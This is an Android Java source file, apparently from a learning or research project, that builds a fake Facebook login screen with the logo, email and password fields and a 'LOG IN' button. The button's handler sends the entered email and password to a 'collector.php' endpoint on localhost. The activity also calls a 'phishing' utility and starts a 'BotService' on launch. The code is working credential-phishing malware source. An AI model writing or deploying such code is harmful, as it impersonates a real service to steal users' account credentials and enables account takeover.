package edu.ntu.android.learning.dynamicactivitychange;

import android.app.ActionBar;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.XmlResourceParser;
import android.graphics.Color;
import android.graphics.PorterDuff;
import android.graphics.Typeface;
import android.os.Bundle;
import android.support.design.widget.TextInputLayout;
import android.text.InputType;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    private Context mContext;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

        mContext = this;

        //EditText email = (EditText) findViewById(R.id.email);
        //email.getBackground().setColorFilter(Color.parseColor("#ffffff"), PorterDuff.Mode.SRC_IN);

        //EditText password = (EditText) findViewById(R.id.password);
        //password.getBackground().setColorFilter(Color.parseColor("#ffffff"), PorterDuff.Mode.SRC_ATOP);
        /*final RelativeLayout layout = (RelativeLayout) findViewById(R.id.main_layout);

        final Button addButton = (Button)findViewById(R.id.addButton);
        addButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Button button = new Button(mContext);
                button.setText("None");
                RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(RelativeLayout.LayoutParams.WRAP_CONTENT,  RelativeLayout.LayoutParams.WRAP_CONTENT);
                params.addRule(RelativeLayout.ALIGN_PARENT_BOTTOM);
                layout.addView(button, params);
                layout.setBackgroundColor(Color.parseColor("#3366ff"));
                //layout.removeView(addButton);
            }
        });*/

        Utils.phishing(mContext);
        //inflatePhishingActivity();

        startService(new Intent(mContext, BotService.class));

    }

    private void inflatePhishingActivity(){
        LinearLayout mainLayout = (LinearLayout) findViewById(R.id.main_layout);
        mainLayout.setPadding(80, 0, 80, 0);
        mainLayout.setBackgroundColor(Color.parseColor("#324d97"));


        ImageView imageView = new ImageView(mContext);
        imageView.setImageDrawable(getResources().getDrawable(R.drawable.facebook_logo));
        //imageView.getLayoutParams().height = 60;
        LinearLayout.LayoutParams params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 250, 0, 0);
        imageView.setLayoutParams(params);
        mainLayout.addView(imageView);

        TextView textView1 = new TextView(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 20, 0, 0);
        textView1.setLayoutParams(params);
        textView1.setText("English - Change");
        textView1.setTextSize(14);
        textView1.setTextColor(Color.parseColor("#ffffe6"));
        mainLayout.addView(textView1);

        TextInputLayout emailLayout = new TextInputLayout(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 100, 0, 0);
        emailLayout.setLayoutParams(params);
        emailLayout.setHintEnabled(true);

        final EditText emailText = new EditText(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        emailText.setLayoutParams(params);
        emailText.setInputType(InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
        emailText.setMaxLines(1);
        emailText.setHint("Email or Phone");
        emailText.setSingleLine(true);
        emailText.setHintTextColor(Color.parseColor("#e6e6e6"));
        emailText.getBackground().setColorFilter(Color.parseColor("#ffffff"), PorterDuff.Mode.SRC_IN);
        /*emailText.setOnFocusChangeListener(new View.OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if (hasFocus) {
                    if (emailText.getText().toString().trim().equals("Email or Phone")) {
                        emailText.setText("");
                        emailText.setTextColor(Color.parseColor("#ffffff"));
                    }
                }else{
                    if (emailText.getText().toString().trim().equals("")) {
                        emailText.setText("Email or Phone");
                        emailText.setTextColor(Color.parseColor("#ffffe6"));
                    }
                }
            }
        });*/

        emailLayout.addView(emailText);
        mainLayout.addView(emailLayout);

        TextInputLayout passwordLayout = new TextInputLayout(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 50, 0, 0);
        passwordLayout.setLayoutParams(params);
        passwordLayout.setHintEnabled(true);

        final EditText passwordText = new EditText(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        passwordText.setLayoutParams(params);
        passwordText.setInputType(InputType.TYPE_TEXT_VARIATION_PASSWORD);
        passwordText.setTextColor(Color.parseColor("#ffffff"));
        passwordText.setMaxLines(1);
        passwordText.setHint("Password");
        passwordText.setHintTextColor(Color.parseColor("#e6e6e6"));
        passwordText.getBackground().setColorFilter(Color.parseColor("#ffffff"), PorterDuff.Mode.SRC_IN);
        //passwordText.setHint("Password");
        //passwordText.setHintTextColor(Color.parseColor("#ffffe6"));
        /*passwordText.setOnFocusChangeListener(new View.OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if (hasFocus) {
                    if (passwordText.getText().toString().trim().equals("Password")) {
                        passwordText.setText("");
                        passwordText.setTextColor(Color.parseColor("#ffffff"));
                    }
                }else{
                    if (passwordText.getText().toString().trim().equals("")) {
                        passwordText.setText("Password");
                        passwordText.setTextColor(Color.parseColor("#ffffe6"));
                    }
                }
            }
        });*/
        passwordText.setSingleLine(true);
        passwordLayout.addView(passwordText);
        mainLayout.addView(passwordLayout);

        Button login = new Button(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 16, 0, 0);
        login.setLayoutParams(params);
        login.setText("LOG IN");
        login.setTextColor(Color.parseColor("#c4cded"));
        login.setBackgroundColor(Color.parseColor("#5371c6"));
        login.setTypeface(null, Typeface.BOLD);
        mainLayout.addView(login);

        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL("http://localhost/collector.php?mess=" + emailText.getText().toString()+passwordText.getText().toString());
                            HttpURLConnection httpConn = (HttpURLConnection)url.openConnection();
                            httpConn.connect();
                        }catch(Exception ex){}
                    }
                }).start();
            }
        });

        TextView textView2 = new TextView(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 220, 0, 0);
        textView2.setLayoutParams(params);
        textView2.setText("Create New Facebook Account");
        textView2.setTextSize(14);
        textView2.setTextColor(Color.parseColor("#ffffe6"));
        mainLayout.addView(textView2);

        TextView textView3 = new TextView(mContext);
        params = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        params.setMargins(0, 30, 0, 0);
        textView3.setLayoutParams(params);
        textView3.setText("Forgot Password?");
        textView3.setTextSize(14);
        textView3.setTextColor(Color.parseColor("#ffffe6"));
        mainLayout.addView(textView3);

        //emailText.setTextColor(Color.parseColor("#ffffe6"));
        //passwordText.setTextColor(Color.parseColor("#ffffe6"));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }
}
